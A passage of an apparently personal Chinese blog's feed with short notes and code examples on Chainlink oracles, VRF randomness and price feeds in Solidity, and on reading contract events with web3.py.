class="string">&quot;d5270d1c311941d0b08bead21fea7747&quot;</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// (Varies by network and job)</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//发送请求，其中有”get“：地址，”path“：解析方式</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">requestVolumeData</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bytes32 requestId</span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(<span class="built_in">this</span>), <span class="built_in">this</span>.fulfill.selector);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里能直接add就是因为using a for b了</span></span><br><span class="line">        request.add(<span class="string">&quot;get&quot;</span>, <span class="string">&quot;http://xx.xx.xx.xx:xx/getIssueEventsPollCon&quot;</span>);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;events&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sendChainlinkRequestTo(oracle, request, fee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回调函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fulfill</span>(<span class="params">bytes32 _requestId, uint256 _volume</span>) <span class="title">public</span> <span class="title">recordChainlinkFulfillment</span>(<span class="params">_requestId</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        volume = _volume;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用完request函数之后，再访问volume的值，就会变成USDT稳定币最新一次增发的数量。</p><p>所以这里完成了链下触发——链上调用API——返回最新增发数的过程。</p><p>本来13号就该发的，蠢了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="chainlink" scheme="https://x1a0.net/tags/chainlink/"/>
    
  </entry>
  
  <entry>
    <title>web3py-event使用小记</title>
    <link href="https://x1a0.net/2021/12/13/web3py-event%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/13/web3py-event%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-13T10:24:28.000Z</published>
    <updated>2021-12-13T10:30:46.652Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, main</span><br><span class="line"><span class="keyword">from</span> usdt <span class="keyword">import</span> abi</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8545&quot;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(url))</span><br><span class="line">address = web3.toChecksumAddress(<span class="string">&#x27;0xdFB34E20656dbA9133fE13274005A1FC4926C7E3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">contract = web3.eth.contract(address=address, abi=abi)</span><br><span class="line">latest = web3.eth.blockNumber</span><br><span class="line">issueEvents = contract.events.Issue.createFilter(fromBlock=<span class="number">0</span>, toBlock=latest)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParsingEvent</span>(<span class="params">data</span>):</span></span><br><span class="line">    issueList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        issueData = &#123;&#125;</span><br><span class="line">        issueData[<span class="string">&#x27;amount&#x27;</span>] = i[<span class="string">&#x27;args&#x27;</span>][<span class="string">&#x27;amount&#x27;</span>]</span><br><span class="line">        issueData[<span class="string">&#x27;address&#x27;</span>] = i[<span class="string">&#x27;address&#x27;</span>]</span><br><span class="line">        issueData[<span class="string">&#x27;blockNumber&#x27;</span>] = i[<span class="string">&#x27;blockNumber&#x27;</span>]</span><br><span class="line">        issueList.append(issueData)</span><br><span class="line">    <span class="keyword">return</span> issueList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIssueEvents</span>(<span class="params">realtime</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        data = issueEvents.get_all_entries()</span><br><span class="line">        pprint(ParsingEvent(data))</span><br><span class="line">        time.sleep(realtime)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getIssueEvents(<span class="number">10</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.写个后端获取暴露个API<br>2.chainlink链上读取<br>3.部署上服务器和ropsten</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Web3.py" scheme="https://x1a0.net/categories/Web3-py/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="Python" scheme="https://x1a0.net/tags/Python/"/>
    
    <category term="web3.py" scheme="https://x1a0.net/tags/web3-py/"/>
    
  </entry>
  
  <entry>
    <title>web3.py使用小记</title>
    <link href="https://x1a0.net/2021/12/13/web3-py%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/13/web3-py%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-12T16:00:31.000Z</published>
    <updated>2021-12-12T16:13:36.635Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 导入web3提供者和合约abi、合约地址</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://kovan.infura.io/v3/34ed41c4cf28406885f032930d670036&#x27;</span>))</span><br><span class="line">abi = <span class="string">&quot;you contract abi&quot;</span></span><br><span class="line">addr = <span class="string">&#x27;0x9326BFA02ADD2366b30bacB125260Af641031331&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义合约实例，调用合约函数</span></span><br><span class="line">contract = web3.eth.contract(address=addr, abi=abi)</span><br><span class="line">validRoundId = <span class="number">18446744073709562301</span></span><br><span class="line">historicalData = contract.functions.getRoundData(validRoundId).call()</span><br><span class="line"><span class="built_in">print</span>(historicalData)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>今天心情很烦躁，已经到了那种想抒发心情都找不到文字的程度了吗。</p><p>想当年你可是一个™的码子小王子。</p><p>想变成什么样子就去做，<br>英雄无惧，<br>无欲则刚。</p><hr><p>例子来自chainlink文档，想找以太坊的event现成的SDK找不到。<br>明天自己造轮子</p><p>最近史诗级漏洞log4j搞得天翻地覆的，<br>抽时间复盘</p><p>生命不息，学习不止</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Web3.py" scheme="https://x1a0.net/categories/Web3-py/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="web3.py" scheme="https://x1a0.net/tags/web3-py/"/>
    
  </entry>
  
  <entry>
    <title>chainlink学习小记</title>
    <link href="https://x1a0.net/2021/12/07/chainlink%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/07/chainlink%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-07T03:04:41.000Z</published>
    <updated>2021-12-07T05:38:58.181Z</updated>
    
    <content type="html"><![CDATA[<p>在合约中获取以太坊的价格</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract PriceConsumerV3 &#123;</span><br><span class="line"></span><br><span class="line">    AggregatorV3Interface internal priceFeed;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        <span class="comment">// 喂价合约地址</span></span><br><span class="line">        priceFeed = AggregatorV3Interface(<span class="number">0x9326BFA02ADD2366b30bacB125260Af641031331</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取最后一轮价格</span></span><br><span class="line">    <span class="function">function <span class="title">getLatestPrice</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(<span class="keyword">int</span>)</span> </span>&#123;</span><br><span class="line">        (</span><br><span class="line">            uint80 roundID, </span><br><span class="line">            <span class="keyword">int</span> price,</span><br><span class="line">            uint startedAt,</span><br><span class="line">            uint timeStamp,</span><br><span class="line">            uint80 answeredInRound</span><br><span class="line">        ) = priceFeed.latestRoundData();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/VRFConsumerBase.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract RandomNumberConsumer is VRFConsumerBase &#123;</span><br><span class="line">    </span><br><span class="line">    bytes32 internal keyHash;</span><br><span class="line">    uint256 internal fee;</span><br><span class="line">    </span><br><span class="line">    uint256 <span class="keyword">public</span> randomResult;</span><br><span class="line">    bytes32 <span class="keyword">public</span> resultId;</span><br><span class="line"></span><br><span class="line">    constructor() </span><br><span class="line">        VRFConsumerBase(</span><br><span class="line">            <span class="number">0xdD3782915140c8f3b190B5D67eAc6dc5760C46E9</span>, <span class="comment">// VRF Coordinator</span></span><br><span class="line">            <span class="number">0xa36085F69e2889c224210F603D836748e7dC0088</span>  <span class="comment">// LINK Token</span></span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        keyHash = <span class="number">0x6c3699283bda56ad74f6b855546325b68d482e983852a7a82979cc4807b641f4</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// 0.1 LINK (Varies by network)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//请求函数</span></span><br><span class="line">    <span class="function">function <span class="title">getRandomNumber</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span>&#123;</span><br><span class="line">        require(LINK.balanceOf(address(<span class="keyword">this</span>)) &gt;= fee, <span class="string">&quot;Not enough LINK - fill contract with faucet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> requestRandomness(keyHash, fee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回调函数</span></span><br><span class="line">    <span class="function">function <span class="title">fulfillRandomness</span><span class="params">(bytes32 requestId, uint256 randomness)</span> internal override </span>&#123;</span><br><span class="line">        randomResult = randomness;</span><br><span class="line">        resultId = requestId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合约中使用随机数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/VRFConsumerBase.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ConfirmedOwner.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract VRFD20 is VRFConsumerBase, ConfirmedOwner(msg.sender) &#123;</span><br><span class="line">    uint256 <span class="keyword">private</span> constant ROLL_IN_PROGRESS = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义公钥和获取随机数需要的费用</span></span><br><span class="line">    bytes32 <span class="keyword">private</span> s_keyHash;</span><br><span class="line">    uint256 <span class="keyword">private</span> s_fee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// requestID和地址之间的映射 和 地址和骰子值之间的映射</span></span><br><span class="line">    mapping(bytes32 =&gt; address) <span class="keyword">private</span> s_rollers;</span><br><span class="line">    mapping(address =&gt; uint256) <span class="keyword">private</span> s_results;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 随机数返回事件 随机数中requestID和地址绑定事件</span></span><br><span class="line">    <span class="function">event <span class="title">DiceRolled</span><span class="params">(bytes32 indexed requestId, address indexed roller)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">DiceLanded</span><span class="params">(bytes32 indexed requestId, uint256 indexed result)</span></span>;</span><br><span class="line"></span><br><span class="line">    constructor(address vrfCoordinator, address link, bytes32 keyHash, uint256 fee)</span><br><span class="line">        VRFConsumerBase(vrfCoordinator, link)</span><br><span class="line">    &#123;</span><br><span class="line">        s_keyHash = keyHash;</span><br><span class="line">        s_fee = fee;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//掷骰子</span></span><br><span class="line">    <span class="function">function <span class="title">rollDice</span><span class="params">(address roller)</span> <span class="keyword">public</span> onlyOwner <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span>&#123;</span><br><span class="line">        require(LINK.balanceOf(address(<span class="keyword">this</span>)) &gt;= s_fee, <span class="string">&quot;Not enough LINK to pay fee&quot;</span>);</span><br><span class="line">        require(s_results[roller] == <span class="number">0</span>, <span class="string">&quot;Already rolled&quot;</span>);</span><br><span class="line">        requestId = requestRandomness(s_keyHash, s_fee);</span><br><span class="line">        s_rollers[requestId] = roller;</span><br><span class="line">        <span class="comment">//如果是roll_in_progress就说明没有掷成功</span></span><br><span class="line">        s_results[roller] = ROLL_IN_PROGRESS;</span><br><span class="line">        <span class="function">emit <span class="title">DiceRolled</span><span class="params">(requestId, roller)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回调函数</span></span><br><span class="line">    <span class="function">function <span class="title">fulfillRandomness</span><span class="params">(bytes32 requestId, uint256 randomness)</span> internal override </span>&#123;</span><br><span class="line">        uint256 d20Value = (randomness % <span class="number">20</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//callback更新roll_in_progress，通过s_rollers找到address，通过address设置骰子返回值</span></span><br><span class="line">        s_results[s_rollers[requestId]] = d20Value;</span><br><span class="line">        <span class="function">emit <span class="title">DiceLanded</span><span class="params">(requestId, d20Value)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">house</span><span class="params">(address player)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        require(s_results[player] != <span class="number">0</span>, <span class="string">&quot;Dice not rolled&quot;</span>);</span><br><span class="line">        require(s_results[player] != ROLL_IN_PROGRESS, <span class="string">&quot;Roll in progress&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过地址获取随机数，分配房子</span></span><br><span class="line">        <span class="keyword">return</span> getHouseName(s_results[player]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//转出link函数</span></span><br><span class="line">    <span class="function">function <span class="title">withdrawLINK</span><span class="params">(address to, uint256 value)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        require(LINK.transfer(to, value), <span class="string">&quot;Not enough LINK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setKeyHash</span><span class="params">(bytes32 keyHash)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        s_keyHash = keyHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">keyHash</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(bytes32)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_keyHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setFee</span><span class="params">(uint256 fee)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        s_fee = fee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">fee</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_fee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">getHouseName</span><span class="params">(uint256 id)</span> <span class="keyword">private</span> pure <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        string[<span class="number">20</span>] memory houseNames = [</span><br><span class="line">            <span class="string">&quot;Targaryen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Lannister&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Stark&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tyrell&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Baratheon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Martell&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tully&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Bolton&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Greyjoy&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Arryn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Frey&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Mormont&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tarley&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Dayne&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Umber&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Valeryon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Manderly&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Clegane&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Glover&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Karstark&quot;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">return</span> houseNames[id - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合约中调用api</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ChainlinkClient.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract APIConsumer is ChainlinkClient &#123;</span><br><span class="line">    using Chainlink <span class="keyword">for</span> Chainlink.Request;</span><br><span class="line">  </span><br><span class="line">    uint256 <span class="keyword">public</span> volume;</span><br><span class="line">    </span><br><span class="line">    address <span class="keyword">private</span> oracle;</span><br><span class="line">    bytes32 <span class="keyword">private</span> jobId;</span><br><span class="line">    uint256 <span class="keyword">private</span> fee;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        setPublicChainlinkToken();</span><br><span class="line">        oracle = <span class="number">0xc57B33452b4F7BB189bB5AfaE9cc4aBa1f7a4FD8</span>;</span><br><span class="line">        jobId = <span class="string">&quot;d5270d1c311941d0b08bead21fea7747&quot;</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// (Varies by network and job)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">requestVolumeData</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(<span class="keyword">this</span>), <span class="keyword">this</span>.fulfill.selector);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;get&quot;</span>, <span class="string">&quot;https://min-api.cryptocompare.com/data/pricemultifull?fsyms=ETH&amp;tsyms=USD&quot;</span>);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;RAW.ETH.USD.OPENHOUR&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sendChainlinkRequestTo(oracle, request, fee);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">function <span class="title">fulfill</span><span class="params">(bytes32 _requestId, uint256 _volume)</span> <span class="keyword">public</span> <span class="title">recordChainlinkFulfillment</span><span class="params">(_requestId)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        volume = _volume;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在合约中获取以太坊的价格&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/s</summary>
      
    
    
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="chainlink" scheme="https://x1a0.net/tags/chainlink/"/>
    
